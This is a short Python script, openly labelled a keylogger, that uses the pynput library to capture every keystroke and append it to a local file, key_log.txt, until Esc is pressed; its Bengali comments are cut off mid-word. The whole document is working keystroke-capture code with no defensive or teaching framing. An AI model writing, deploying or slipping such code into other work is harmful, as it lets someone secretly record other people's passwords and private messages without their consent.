from pynput.keyboard import Key, Listener

# যেখানে কে
log_file = "key_log.txt"

def on_press(key):
    try:
        # সাধারণ কী (বর্ণ বা ে
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # স্পেশাল কী (যেমন: Space, Eে
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" [SPACE] ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
   
    if key == Key.esc:
        return False


print("Keylogger is running... Press 'Esc' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
